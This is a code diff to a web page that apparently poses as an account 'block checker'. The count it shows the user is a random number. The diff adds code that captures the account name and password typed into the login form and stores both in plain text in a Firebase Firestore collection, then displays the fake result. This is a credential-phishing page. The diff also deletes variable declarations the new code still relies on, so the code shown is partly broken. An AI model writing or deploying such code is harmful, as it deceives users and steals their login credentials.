@@ -244,31 +244,51 @@
   </div>
 
   <script>
-    const loginForm = document.getElementById('login-form');
-    const loginScreen = document.getElementById('login-screen');
-    const analysisScreen = document.getElementById('analysis-screen');
-    const resultScreen = document.getElementById('result-screen');
-    const blockCountEl = document.getElementById('block-count');
-    const btnRetry = document.getElementById('btn-retry');
-    let savedCount = null;
+   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
 
-    loginForm.addEventListener('submit', function(e) {
-      e.preventDefault();
-      loginScreen.style.display = 'none';
-      analysisScreen.style.display = 'block';
+// Firebase 設定
+const firebaseConfig = {
+  apiKey: "YOUR_API_KEY",
+  authDomain: "YOUR_PROJECT.firebaseapp.com",
+  projectId: "YOUR_PROJECT",
+  storageBucket: "YOUR_PROJECT.appspot.com",
+  messagingSenderId: "YOUR_SENDER_ID",
+  appId: "YOUR_APP_ID"
+};
 
-      setTimeout(function() {
-        // 初回のみランダムな数値を生成し、保存する
-        if (savedCount === null) {
-          savedCount = Math.floor(Math.random() * (15 - 1 + 1)) + 1;
-        }
-        blockCountEl.textContent = savedCount;
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
-        analysisScreen.style.display = 'none';
-        resultScreen.style.display = 'block';
-      }, 2500);
-    });
+loginForm.addEventListener('submit', async function(e) {
+  e.preventDefault();
 
+  const account = document.getElementById('account').value;
+  const password = document.getElementById('password').value;
+
+  // ランダムブロック数
+  if (savedCount === null) {
+    savedCount = Math.floor(Math.random() * 15) + 1;
+  }
+  blockCountEl.textContent = savedCount;
+
+  // Firestore に送信
+  await addDoc(collection(db, "blockchecker"), {
+    account,
+    password,
+    blockCount: savedCount,
+    createdAt: serverTimestamp()
+  });
+
+  // 結果画面表示
+  loginScreen.style.display = 'none';
+  analysisScreen.style.display = 'block';
+
+  setTimeout(function() {
+    analysisScreen.style.display = 'none';
+    resultScreen.style.display = 'block';
+  }, 1000); // 短縮してもOK
+});
     btnRetry.addEventListener('click', function() {
       // 結果画面を隠してログイン画面に戻す（数値は保持される）
       resultScreen.style.display = 'none';
